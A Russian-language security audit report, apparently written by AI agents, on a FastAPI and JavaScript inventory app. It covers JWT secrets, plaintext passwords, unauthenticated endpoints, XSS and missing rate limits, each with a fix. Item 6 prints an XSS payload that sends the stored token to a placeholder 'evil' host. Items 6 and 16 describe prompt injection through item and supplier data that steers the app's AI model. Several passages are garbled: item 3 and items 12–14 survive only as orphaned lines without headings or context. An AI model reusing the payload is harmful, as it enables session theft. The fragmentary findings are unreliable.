# Аудит безопасности — ROMALEX таблица учёта

[[ROMALEX]] 

Аудит проведён 18.06.2026 тремя параллельными агентами на Opus 4.7. Покрыты: бэкенд (FastAPI), фронтенд (JS), архитектура + БД (SQLite).

---

## 🔴 КРИТИЧНО — чинить в первую очередь

### 1. JWT_SECRET = "change-me" по умолчанию
**Файл:** `backend/auth.py:10`
```python
SECRET_KEY = os.getenv("JWT_SECRET", "change-me")
```
Если в `.env` не задан `JWT_SECRET` — приложение поднимается с известным всем секретом. Любой может подписать токен с ролью админа и войти без пароля.

**Фикс:**
```python
SECRET_KEY = os.environ["JWT_SECRET"]  # KeyError при старте = лучше тихой дыры
```

---

### 2. Пароли в .env в plain-text
**Файл:** `backend/auth.py:31-39`
`ADMIN_PASS_N` хранится как открытый текст, сравнение через `password == stored`. Любой дамп `.env` = готовые пароли. Плюс уязвимость к timing-атаке.

**Фикс:** Перейти на bcrypt. Хранить в `.env` хэши, а не пароли:
```python
from passlib.context import CryptContext
pwd_ctx = CryptContext(schemes=["bcrypt"])
# В .env: ADMIN_PASS_1=$2b$12$...хэш...
# Проверка:
if not pwd_ctx.verify(password, stored_hash):
    raise HTTPException(401)
```

allow_origins=["*"], allow_methods=["*"], allow_headers=["*"]

### 4. Три публичных endpoint без авторизации
**Файл:** `backend/main.py:57, 134, 142`
- `GET /api/items/{tab}` — вся номенклатура и складские остатки
- `GET /api/operations/{item_id}` — история операций, поставщики, накладные
- `GET /api/last-update` — метаданные

Любой, кто знает URL, выкачивает всю коммерческую базу клиента без токена.

**Фикс:** Добавить `Depends(get_current_user)` на все три функции:
```python
@app.get("/api/items/{tab}")
def get_items(tab: str, user: str = Depends(get_current_user)):
```

---

### 5. Нет разделения ролей (admin vs user)
**Файлы:** `backend/main.py`, `backend/auth.py`
`get_current_user` проверяет только факт авторизации. Любой авторизованный может:
- Удалить любую операцию (`DELETE /api/operations/{id}`)
- Переписать смету (`PUT /api/items/{id}/estimate`)
- Перетасовать порядок строк (`PATCH /api/items/reorder`)
- Создать операцию с любой датой без автора

**Фикс:**
1. Добавить `role` в JWT payload при выдаче токена
2. Добавить `require_admin` dependency:
```python
def require_admin(user: str = Depends(get_current_user)):
    token_data = decode_token(user)
    if token_data.get("role") != "admin":
        raise HTTPException(403, "Только для администратора")
    return user
```
3. Навесить на DELETE, PUT /estimate, PATCH /reorder

### 6. XSS через AI-ответ без санитизации
**Файл:** `frontend/app.js:188`
```js
div.innerHTML = marked.parse(text);  // ← нет DOMPurify!
```
Prompt injection через данные проекта (названия позиций, поставщики) → AI возвращает `<img onerror="fetch('//evil/'+localStorage.token)">` → угон токена.

**Фикс:**
```html
<!-- В index.html подключить: -->
<script src="https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js"></script>
```
```js
div.innerHTML = DOMPurify.sanitize(marked.parse(text));
```

## 🟡 ВАЖНО — починить в ближайшее время

### 7. JWT токен в localStorage (уязвим к XSS-краже)
**Файл:** `frontend/app.js:39, 44`
localStorage доступен из любого JS на странице. При XSS (см. п.6) токен утекает мгновенно.

**Фикс минимум:** sessionStorage (живёт пока вкладка открыта). Максимум — httpOnly cookie на сервере.

---

### 8. isAdmin() = просто наличие токена
**Файл:** `frontend/app.js:41`
```js
function isAdmin() { return !!getToken(); }
```
Любая строка в localStorage даёт UI администратора.

**Фикс:** Декодировать JWT payload (atob) и проверять поле `role`:
```js
function isAdmin() {
  const t = getToken();
  if (!t) return false;
  try {
    const payload = JSON.parse(atob(t.split('.')[1]));
    return payload.role === 'admin' && payload.exp > Date.now()/1000;
  } catch { return false; }
}
```

### 9. Нет rate limiting на /api/auth/login
При plain-паролях (п.2) и 1-2 пользователях — брутфорс словарём ломает за минуты.

**Фикс:** `pip install slowapi` + лимит 5 попыток/мин на IP.

### 10. N+1 запросов в GET /api/items
**Файл:** `backend/main.py:60-95`
Для каждой из 117 позиций — отдельный SELECT. Итого 118 запросов на каждый рендер таблицы.

**Фикс:** Один JOIN с GROUP BY:
```sql
SELECT i.*, o.warehouse, o.op_type, SUM(o.amount) as total
FROM items i
LEFT JOIN operations o ON o.item_id = i.id
WHERE i.tab = ?
GROUP BY i.id, o.warehouse, o.op_type
```

### 11. Нет индексов в БД
Нет ни одного индекса кроме автоматических PK.

**Фикс:** Выполнить в БД:

CREATE INDEX idx_ops_item ON operations(item_id);
CREATE INDEX idx_ops_date ON operations(date DESC);
CREATE INDEX idx_chats_user ON chats(username);
CREATE INDEX idx_msgs_chat ON chat_messages(chat_id);

**Фикс:** Писать оба сообщения (user + assistant) в одной транзакции ПОСЛЕ успешного ответа Ollama.

Можно залить гигабайт — ляжет и сервер и Ollama (base64 × 1.33 по памяти).

if file.size > 10 * 1024 * 1024:

**Файл:** `frontend/app.js:466, 683`
```js
tbody.innerHTML = `...Ошибка: ${e.message}`;  // ← XSS если e.message содержит HTML
```

### 15. Утечка соединений с БД
**Файл:** `backend/main.py` — повсюду
`db.close()` только в happy-path. При любом HTTPException соединение не закрывается.

**Фикс:** Обернуть в `try/finally` или использовать dependency с `yield`:
```python
def get_db_conn():
    db = get_db()
    try:
        yield db
    finally:
        db.close()
```

### 16. Prompt injection через поля supplier/invoice
**Файл:** `backend/main.py:432-437`
Данные из накладных (supplier, invoice) без ограничения длины склеиваются в system-промпт Gemma. Один пользователь может «отравить» контекст для других.

**Фикс:** `Field(max_length=200)` в Pydantic-модели + экранирование перед вставкой в промпт.

### 17. API захардкожен как http://localhost:8000
**Файл:** `frontend/app.js:6`
В продакшене: пароль и токен летят в plaintext, HTTPS не подключён.

**Фикс:** Относительный путь `/api` + HTTPS + HSTS на проде.

## ⚪ ЗАМЕЧАНИЯ

- `esc()` не экранирует одинарную кавычку `'` — добавить `.replace(/'/g, '&#39;')`
- Inline `onclick=` несовместимы с Content-Security-Policy
- `marked` с CDN без SRI хэша (`integrity="sha384-..."`)
- `datetime.utcnow()` deprecated в Python 3.12+, заменить на `datetime.now(timezone.utc)`
- `DB_PATH = "romalex.db"` — относительный путь, рискованно при запуске из другой папки
- Нет механизма миграций БД (правки делаются руками)
- Нет автоматического бэкапа (сейчас только ручной `romalex_backup_before_tz.db`)
- `GET /api/chats` возвращает `ORDER BY id ASC` вместо `DESC` — показывает первое сообщение, а не последнее
